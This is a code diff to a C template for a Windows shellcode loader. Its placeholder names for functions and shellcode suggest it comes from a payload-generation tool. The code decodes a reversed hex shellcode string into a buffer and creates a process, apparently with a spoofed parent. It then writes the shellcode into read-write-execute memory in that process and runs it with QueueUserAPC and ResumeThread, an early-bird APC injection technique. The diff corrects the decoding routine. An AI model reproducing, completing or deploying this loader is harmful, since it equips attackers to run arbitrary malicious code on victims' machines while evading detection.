@@ -4,8 +4,6 @@
 #include <TlHelp32.h>
 #include <stdio.h>
 
-
-
 DWORD {{FUNCTION1}}() {
     HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     PROCESSENTRY32 process = { 0 };
@@ -23,17 +21,17 @@ DWORD {{FUNCTION1}}() {
     return process.th32ProcessID;
 }
 
-
-unsigned int {{FUNCTION}}(char* hexbuffer) {
-    _strrev(hexbuffer);
-    unsigned int char_in_hex;
-    unsigned int iterations = strlen(hexbuffer);
-    unsigned int memory_allocation = strlen(hexbuffer) / 2;
-    for (unsigned int i = 0; i < iterations - 1; i++) {
-        sscanf_s(hexbuffer + 2 * i, "%2X", &char_in_hex);
-        hexbuffer[i] = (char)char_in_hex;
-    }
-    return memory_allocation;
+void {{FUNCTION}}(char* array, char* buf) {
+	_strrev(array);
+	while (*array) {
+		if (' ' == *array) {
+			array++;
+			continue;
+		}
+		sscanf(array, "%02X", buf);
+		array += 2;
+		buf++;
+	}
 }
 
 
@@ -41,7 +39,18 @@ int main() {
 
     char hexbuffer[] = "{{SHELLCODE_STR}}";
 
-    unsigned int memory_allocation = {{FUNCTION}}(hexbuffer);
+	unsigned int memory_allocation = strlen(hexbuffer) / 2;
+
+	char* buf = (char*)malloc(memory_allocation);
+
+	if (NULL == buf) {
+		printf("malloc error");
+		return 1;
+	}
+
+	memset(buf, 0, memory_allocation);
+
+    {{FUNCTION}}(hexbuffer, buf);
 
     STARTUPINFOEXA sInfoEX;
     PROCESS_INFORMATION pInfo;
@@ -60,7 +69,7 @@ int main() {
 
     LPVOID lpBaseAddress = (LPVOID)VirtualAllocEx(pInfo.hProcess, NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
     SIZE_T* lpNumberOfBytesWritten = 0;
-    BOOL resWPM = WriteProcessMemory(pInfo.hProcess, lpBaseAddress, (LPVOID)hexbuffer, memory_allocation, lpNumberOfBytesWritten);
+    BOOL resWPM = WriteProcessMemory(pInfo.hProcess, lpBaseAddress, (LPVOID)buf, memory_allocation, lpNumberOfBytesWritten);
 
     QueueUserAPC((PAPCFUNC)lpBaseAddress, pInfo.hThread, NULL);
     ResumeThread(pInfo.hThread);
